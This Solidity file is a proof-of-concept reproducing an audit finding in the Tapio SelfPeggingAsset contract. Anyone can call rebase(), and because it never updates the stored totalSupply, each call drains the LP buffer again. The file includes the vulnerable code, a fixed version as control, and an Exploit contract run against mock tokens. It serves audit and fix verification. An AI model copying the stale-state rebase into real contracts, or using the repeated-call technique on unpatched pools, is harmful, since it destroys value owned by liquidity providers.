// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of NUTS Finance (Tapio) finding 62662:
// "Buffer drainage through repeated rebase calls due to stale state variables".
//
// Source: https://github.com/nutsfinance/tapio-eth
// Vulnerable (audited) commit state: 46eb22ba~1 — the PARENT of the fix commit
//   46eb22ba "fix: prevent buffer drainage", which added
//     `balances = _balances; totalSupply = newD;`
//   INSIDE the `oldD > newD` branch of `rebase()` BEFORE the removeTotalSupply
//   call. In the audited (pre-fix) version below, that branch reduces the
//   poolToken buffer but NEVER updates the contract's `balances` / `totalSupply`.
//
// Because `totalSupply` (oldD) stays stale while the underlying token balances —
// and therefore the recomputed invariant `newD = _getD(_balances)` — are
// unchanged across calls, EVERY subsequent permissionless `rebase()` recomputes
// the SAME `oldD > newD` gap and removes the buffer AGAIN. An attacker calls the
// unprotected `rebase()` repeatedly to drain the protocol's entire buffer
// (LP-holder-owned accrued value): a value-destruction DoS.
//
// The vulnerable `rebase()` body and the StableSwap `_getD()` invariant math are
// reproduced VERBATIM from the audited source. Only the opaque external
// boundaries are minimal faithful doubles: the underlying ERC20 (IERC20), the
// exchange-rate provider, and the LPToken (poolToken) whose `removeTotalSupply`
// decrements a real `bufferAmount`. None of the vulnerable code is mocked.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

// @dev Real Tapio interface (src/interfaces/IExchangeRateProvider.sol), verbatim.
interface IExchangeRateProvider {
    function exchangeRate() external view returns (uint256);
    function exchangeRateDecimals() external view returns (uint256);
}

// @dev Real Tapio interface (src/interfaces/ILPToken.sol), relevant subset.
interface ILPToken {
    function removeTotalSupply(uint256 _amount, bool isBuffer, bool withDebt) external;
    function addTotalSupply(uint256 _amount) external;
}

// ─────────────────────────────────────────────────────────────────────────────
// Minimal faithful ERC20 double for an opaque underlying token. Its balance is
// the LIVE pool balance the vulnerable rebase() reads each call; it does NOT
// change between rebase calls (nobody deposits/withdraws), so newD is constant.
// ─────────────────────────────────────────────────────────────────────────────
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Minimal faithful double for a ConstantExchangeRateProvider: rate 1, decimals 0
// (so the rebase loop math is the identity — `balanceI` passes through unchanged).
// ─────────────────────────────────────────────────────────────────────────────
contract ConstantExchangeRateProvider is IExchangeRateProvider {
    function exchangeRate() external pure returns (uint256) {
        return 1;
    }

    function exchangeRateDecimals() external pure returns (uint256) {
        return 0;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Minimal faithful double for the Tapio LPToken (poolToken) buffer boundary.
// `removeTotalSupply` is reproduced verbatim from src/LPToken.sol@46eb22ba~1 —
// it decrements the real `bufferAmount` (and books `bufferBadDebt`). This is the
// value that gets drained repeatedly.
// ─────────────────────────────────────────────────────────────────────────────
contract LPTokenDouble is ILPToken {
    mapping(address => bool) public pools;
    uint256 public bufferAmount;
    uint256 public bufferBadDebt;

    event BufferDecreased(uint256, uint256);
    event BufferIncreased(uint256, uint256);

    error NoPool();
    error InvalidAmount();
    error InsufficientBuffer();

    function addPool(address pool) external {
        pools[pool] = true;
    }

    function seedBuffer(uint256 amount) external {
        bufferAmount += amount;
    }

    // Verbatim from src/LPToken.sol@46eb22ba~1 (buffer branch is the exercised path).
    function removeTotalSupply(uint256 _amount, bool isBuffer, bool withDebt) external {
        require(pools[msg.sender], NoPool());
        require(_amount != 0, InvalidAmount());

        if (isBuffer) {
            require(_amount <= bufferAmount, InsufficientBuffer());
            bufferAmount -= _amount;
            if (withDebt) {
                bufferBadDebt += _amount;
            }
            emit BufferDecreased(_amount, bufferAmount);
        } else {
            // (totalSupply branch — not exercised by the rebase loss path)
            revert InvalidAmount();
        }
    }

    // Minimal faithful addTotalSupply (bad-debt-first path). Not exercised by the
    // vulnerable oldD>newD branch; present only to satisfy the interface.
    function addTotalSupply(uint256 _amount) external {
        require(pools[msg.sender], NoPool());
        require(_amount != 0, InvalidAmount());
        if (bufferBadDebt >= _amount) {
            bufferBadDebt -= _amount;
            bufferAmount += _amount;
        } else {
            bufferAmount += bufferBadDebt;
            bufferBadDebt = 0;
        }
        emit BufferIncreased(_amount, bufferAmount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. `rebase()` and `_getD()` are reproduced VERBATIM from
// SelfPeggingAsset.sol@46eb22ba~1 (the audited, pre-fix state). The stale-state
// omission in the `oldD > newD` branch is the bug (marked `// @>`).
// ─────────────────────────────────────────────────────────────────────────────
contract SelfPeggingAsset {
    address[] public tokens;
    uint256[] public precisions;
    uint256[] public balances;
    uint256 public totalSupply;
    uint256 public A;
    IExchangeRateProvider[] public exchangeRateProviders;
    ILPToken public poolToken;

    constructor(
        address[] memory _tokens,
        uint256[] memory _precisions,
        IExchangeRateProvider[] memory _exchangeRateProviders,
        ILPToken _poolToken,
        uint256 _A,
        uint256 _initialD
    ) {
        tokens = _tokens;
        precisions = _precisions;
        exchangeRateProviders = _exchangeRateProviders;
        poolToken = _poolToken;
        A = _A;
        // `balances` seeded at pool length; the rebase loop overwrites from LIVE
        // token balances. `totalSupply` (oldD) is the last-recorded invariant D,
        // recorded when the pool held more value; a subsequent underlying loss
        // has since dropped the true D below it — exactly what the buffer exists
        // to cover ONCE.
        balances = new uint256[](_tokens.length);
        totalSupply = _initialD;
    }

    // ── VERBATIM rebase() from SelfPeggingAsset.sol@46eb22ba~1 ──────────────────
    function rebase() external returns (uint256) {
        uint256[] memory _balances = balances;
        uint256 oldD = totalSupply;

        for (uint256 i = 0; i < _balances.length; i++) {
            uint256 balanceI = IERC20(tokens[i]).balanceOf(address(this));
            balanceI = (balanceI * (exchangeRateProviders[i].exchangeRate()))
                / (10 ** exchangeRateProviders[i].exchangeRateDecimals());
            _balances[i] = balanceI * precisions[i];
        }
        uint256 newD = _getD(_balances);

        if (oldD == newD) {
            return 0;
        } else if (oldD > newD) {
            poolToken.removeTotalSupply(oldD - newD, true, true); // @> drains buffer but never updates `balances`/`totalSupply`, so the SAME gap re-triggers every call
            return 0;
        } else {
            balances = _balances;
            totalSupply = newD;
            uint256 _amount = newD - oldD;
            poolToken.addTotalSupply(_amount);
            return _amount;
        }
    }

    // ── VERBATIM _getD() (StableSwap invariant) from @46eb22ba~1 ────────────────
    function _getD(uint256[] memory _balances) internal view returns (uint256) {
        uint256 sum = 0;
        uint256 i = 0;
        uint256 Ann = A;
        /*
     * We choose to implement n*n instead of n*(n-1) because it's
     * clearer in code and A value across pool is comparable.
     */
        bool allZero = true;
        for (i = 0; i < _balances.length; i++) {
            uint256 correctedBalance = _balances[i];
            if (correctedBalance != 0) {
                allZero = false;
            } else {
                correctedBalance = 1;
            }
            sum = sum + correctedBalance;
            Ann = Ann * _balances.length;
        }
        if (allZero) return 0;

        uint256 prevD = 0;
        uint256 D = sum;
        for (i = 0; i < 255; i++) {
            uint256 pD = D;
            for (uint256 j = 0; j < _balances.length; j++) {
                pD = (pD * D) / (_balances[j] * _balances.length);
            }
            prevD = D;
            D = ((Ann * sum + pD * _balances.length) * D) / ((Ann - 1) * D + (_balances.length + 1) * pD);
            if (D > prevD) {
                if (D - prevD <= 1) break;
            } else {
                if (prevD - D <= 1) break;
            }
        }
        if (i == 255) {
            revert("doesn't converge");
        }
        return D;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (negative control): the HEAD fix updates `balances`/`totalSupply`
// INSIDE the `oldD > newD` branch BEFORE removeTotalSupply. After one legitimate
// rebase, `totalSupply == newD`, so a second call sees `oldD == newD` and returns
// 0 — the buffer is drained exactly ONCE.
// ─────────────────────────────────────────────────────────────────────────────
contract SelfPeggingAssetFixed {
    address[] public tokens;
    uint256[] public precisions;
    uint256[] public balances;
    uint256 public totalSupply;
    uint256 public A;
    IExchangeRateProvider[] public exchangeRateProviders;
    ILPToken public poolToken;

    constructor(
        address[] memory _tokens,
        uint256[] memory _precisions,
        IExchangeRateProvider[] memory _exchangeRateProviders,
        ILPToken _poolToken,
        uint256 _A,
        uint256 _initialD
    ) {
        tokens = _tokens;
        precisions = _precisions;
        exchangeRateProviders = _exchangeRateProviders;
        poolToken = _poolToken;
        A = _A;
        balances = new uint256[](_tokens.length);
        totalSupply = _initialD;
    }

    function rebase() external returns (uint256) {
        uint256[] memory _balances = balances;
        uint256 oldD = totalSupply;

        for (uint256 i = 0; i < _balances.length; i++) {
            uint256 balanceI = IERC20(tokens[i]).balanceOf(address(this));
            balanceI = (balanceI * (exchangeRateProviders[i].exchangeRate()))
                / (10 ** exchangeRateProviders[i].exchangeRateDecimals());
            _balances[i] = balanceI * precisions[i];
        }
        uint256 newD = _getD(_balances);

        if (oldD == newD) {
            return 0;
        } else if (oldD > newD) {
            balances = _balances;      // FIX: sync stored state so the gap does
            totalSupply = newD;        //      not re-trigger on the next call.
            poolToken.removeTotalSupply(oldD - newD, true, true);
            return 0;
        } else {
            balances = _balances;
            totalSupply = newD;
            uint256 _amount = newD - oldD;
            poolToken.addTotalSupply(_amount);
            return _amount;
        }
    }

    function _getD(uint256[] memory _balances) internal view returns (uint256) {
        uint256 sum = 0;
        uint256 i = 0;
        uint256 Ann = A;
        bool allZero = true;
        for (i = 0; i < _balances.length; i++) {
            uint256 correctedBalance = _balances[i];
            if (correctedBalance != 0) {
                allZero = false;
            } else {
                correctedBalance = 1;
            }
            sum = sum + correctedBalance;
            Ann = Ann * _balances.length;
        }
        if (allZero) return 0;

        uint256 prevD = 0;
        uint256 D = sum;
        for (i = 0; i < 255; i++) {
            uint256 pD = D;
            for (uint256 j = 0; j < _balances.length; j++) {
                pD = (pD * D) / (_balances[j] * _balances.length);
            }
            prevD = D;
            D = ((Ann * sum + pD * _balances.length) * D) / ((Ann - 1) * D + (_balances.length + 1) * pD);
            if (D > prevD) {
                if (D - prevD <= 1) break;
            } else {
                if (prevD - D <= 1) break;
            }
        }
        if (i == 255) {
            revert("doesn't converge");
        }
        return D;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver. Anyone can call the unprotected rebase(); the attacker calls
// it 3x to drain 3x(oldD-newD) from the buffer vs 1x for a single legitimate
// rebase against the fixed contract. Harm (destroyed buffer-units) is recorded on
// a MARKER token minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant A_COEFF = 100;
    uint256 internal constant INITIAL_D = 1000;   // oldD: last-recorded invariant
    uint256 internal constant LIVE_BALANCE = 900; // current underlying → newD = 900
    uint256 internal constant INITIAL_BUFFER = 1000;
    uint256 internal constant REBASE_CALLS = 3;

    // Exposed results.
    uint256 public gapPerCall;          // oldD - newD  (= 100)
    uint256 public buggyBufferDrained;  // 3 * 100 = 300
    uint256 public fixedBufferDrained;  // 1 * 100 = 100
    uint256 public buggyBufferRemaining;
    uint256 public fixedBufferRemaining;
    uint256 public sinkMarkerBalance;   // = buggyBufferDrained

    address public vulnAddr;
    address public fixedAddr;
    address public poolTokenAddr;
    address public fixedPoolTokenAddr;
    address public markerAddr;

    function run() external payable {
        // ── deploy the shared opaque boundaries (fixed order) ──
        MiniToken underlying = new MiniToken("Underlying", "UND");           // nonce 1
        ConstantExchangeRateProvider erp = new ConstantExchangeRateProvider(); // nonce 2

        // ═══════════════ BUGGY PATH ═══════════════
        LPTokenDouble poolToken = new LPTokenDouble();                       // nonce 3
        poolToken.seedBuffer(INITIAL_BUFFER);

        address[] memory tokens = new address[](1);
        tokens[0] = address(underlying);
        uint256[] memory precisions = new uint256[](1);
        precisions[0] = 1;
        IExchangeRateProvider[] memory erps = new IExchangeRateProvider[](1);
        erps[0] = erp;

        SelfPeggingAsset spa =
            new SelfPeggingAsset(tokens, precisions, erps, poolToken, A_COEFF, INITIAL_D); // nonce 4
        poolToken.addPool(address(spa));
        // Live pool balance is 900 (< recorded D of 1000): a real, one-time loss
        // the buffer is meant to cover once.
        underlying.mint(address(spa), LIVE_BALANCE);

        vulnAddr = address(spa);
        poolTokenAddr = address(poolToken);

        // Attacker calls the permissionless rebase() repeatedly.
        for (uint256 k = 0; k < REBASE_CALLS; k++) {
            spa.rebase();
        }
        buggyBufferRemaining = poolToken.bufferAmount();
        buggyBufferDrained = INITIAL_BUFFER - buggyBufferRemaining;

        // ═══════════════ FIXED PATH (negative control) ═══════════════
        LPTokenDouble poolTokenFixed = new LPTokenDouble();                  // nonce 5
        poolTokenFixed.seedBuffer(INITIAL_BUFFER);

        SelfPeggingAssetFixed spaFixed =
            new SelfPeggingAssetFixed(tokens, precisions, erps, poolTokenFixed, A_COEFF, INITIAL_D); // nonce 6
        poolTokenFixed.addPool(address(spaFixed));
        underlying.mint(address(spaFixed), LIVE_BALANCE);

        fixedAddr = address(spaFixed);
        fixedPoolTokenAddr = address(poolTokenFixed);

        for (uint256 k = 0; k < REBASE_CALLS; k++) {
            spaFixed.rebase();
        }
        fixedBufferRemaining = poolTokenFixed.bufferAmount();
        fixedBufferDrained = INITIAL_BUFFER - fixedBufferRemaining;

        gapPerCall = INITIAL_D - LIVE_BALANCE; // 100

        // ── record the destroyed buffer-units on the MARKER token (deployed LAST) ──
        MiniToken marker = new MiniToken("BufferDestroyed", "DESTROYED-BUFFER"); // nonce 7 (LAST)
        markerAddr = address(marker);
        marker.mint(SINK, buggyBufferDrained);
        sinkMarkerBalance = marker.balanceOf(SINK);

        // ── HARM: repeated calls destroyed strictly more buffer than one call ──
        require(buggyBufferDrained == REBASE_CALLS * gapPerCall, "buggy must drain per-call");
        require(fixedBufferDrained == gapPerCall, "fixed must drain exactly once");
        require(buggyBufferDrained > fixedBufferDrained, "bug amplifies buffer destruction");
    }
}
